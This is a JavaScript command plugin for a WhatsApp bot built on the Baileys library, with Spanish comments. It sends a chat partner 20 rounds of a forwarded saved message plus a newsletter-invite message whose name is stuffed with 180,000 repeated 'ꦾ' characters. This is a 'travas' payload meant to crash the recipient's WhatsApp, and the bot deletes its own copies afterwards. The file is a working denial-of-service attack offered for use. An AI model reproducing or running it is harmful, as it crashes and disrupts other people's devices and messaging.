import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let handler = async (m, { conn }) => {
  try {
    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');

    const normalize = jid => jid.split('@')[0];
    if (normalize(m.sender) !== normalize(conn.user.jid)) {
      return m.reply('❌ Solo el número del bot puede usar este comando.');
    }

    await conn.sendMessage(m.chat, {
      text: '🚨 Hey salte del chat o te dará crash. Tienes 30 segundos.',
    }, { quoted: m });

    setTimeout(async () => {
      if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
      const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
      if (!mensaje?.message) return m.reply('❌ El archivo está dañado o incompleto.');

      for (let i = 0; i < 20; i++) {
        // 1️⃣ Reenviar mensaje desde archivo
        const reenviado = await conn.copyNForward(m.chat, mensaje, true);

        // Eliminar localmente para el bot
        await conn.sendMessage(conn.user.id, {
          delete: {
            remoteJid: m.chat,
            fromMe: true,
            id: reenviado.key.id,
            participant: conn.user.id
          }
        });

        // 2️⃣ Generar y enviar mensaje tipo canal
        const travas = 'ꦾ'.repeat(90000);
        const canalMessage = {
          newsletterAdminInviteMessage: {
            newsletterJid: "120363282786345717@newsletter",
            newsletterName: "🗣🗣🗣🗣" + travas + travas,
            jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
            caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
            inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
          }
        };

        const generado = await generateWAMessageFromContent(m.chat, canalMessage, {
          userJid: conn.user.id
        });

        await conn.relayMessage(m.chat, generado.message, { messageId: generado.key.id });

        // Eliminar localmente para el bot
        await conn.sendMessage(conn.user.id, {
          delete: {
            remoteJid: m.chat,
            fromMe: true,
            id: generado.key.id,
            participant: conn.user.id
          }
        });

        // Esperar 500ms entre envíos para evitar crashes del bot o bloqueos
        await wait(500);
      }

      await conn.sendMessage(m.chat, {
        text: '✅ Los 20 mensajes fueron enviados y eliminados localmente solo para el bot.'
      }, { quoted: m });

    }, 30000); // Esperar 30 segundos

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['enviarmsg'];
export default handler;